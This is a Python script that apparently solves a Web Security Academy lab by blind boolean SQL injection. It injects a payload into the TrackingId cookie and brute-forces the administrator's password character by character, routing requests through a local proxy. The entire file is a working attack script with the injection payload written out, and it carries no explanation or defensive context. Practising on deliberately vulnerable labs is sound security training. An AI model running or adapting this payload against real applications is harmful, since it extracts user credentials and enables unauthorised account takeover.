import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

url = 'https://0af900980411d3bd8255f15d001a00e2.web-security-academy.net'

password_extracted = ""
for i in range(1,21):
    for j in range(32,126):
        sqli_payload = f"' and (select ascii(substring(password,{i},1)) from users where username='administrator')='{j}'--"
        cookies = {'TrackingId': 'wlpwD02zUvSIZvOb' + sqli_payload, 'session': '4YU37P06C9dva2N3cF1SBdUqnlrctdln'}
        r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
        if "Welcome" in r.text:
            password_extracted += chr(j)
            print(password_extracted)
            break


print(password_extracted)
